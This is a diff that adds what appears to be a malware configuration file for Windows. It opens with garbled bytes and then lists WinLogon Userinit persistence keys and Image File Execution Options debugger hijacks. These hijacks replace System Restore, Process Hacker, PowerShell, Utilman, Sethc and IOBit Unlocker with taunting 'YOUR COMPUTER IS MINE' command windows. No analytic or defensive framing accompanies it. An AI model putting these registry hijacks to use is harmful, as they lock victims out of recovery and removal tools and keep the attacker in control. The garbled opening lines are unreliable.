@@ -1,0 +1,22 @@
+_¡?µ?ùá??Ç??ùá?
+_¡?á£??? ?òá?Ç?
+_¡¾4~¡?á£????òá
+_¡þ^&*|@²áó_æåí
+_¡þ??à?????£??É
+
+HKEY_LOCAL_MACHINE:
+
+SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon Userinit
+SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon Userinit
+
+SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe Debugger
+logoff.exe
+sfc.exe
+shutdown.exe
+
+IOBITUnlocker.exe C:\\Windows\\System32\\cmd.exe /c color 04 & title YOU ARE TRYING TO KILL ME HUH??? &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run IOBITUnlocker.exe &pause >nul
+rstrui.exe C:\\Windows\\System32\\cmd.exe /c color 0a & title System Restore &  echo Nice try &pause >nul
+ProcessHacker.exe C:\\Windows\\System32\\cmd.exe /c color 04 & title PROCESSHACKER.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run PROCESSHACKER.EXE &pause >nul
+Powershell.exe C:\\Windows\\System32\\cmd.exe /c title POWERSHELL.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run POWERSHELL &pause >nul
+Utilman.exe C:\\Windows\\System32\\cmd.exe /c color 04 & title UTILMAN.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE &pause >nul
+SetHC.exe C:\\Windows\\System32\\cmd.exe /c color 04 & title SETHC.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MIN &pause >nul
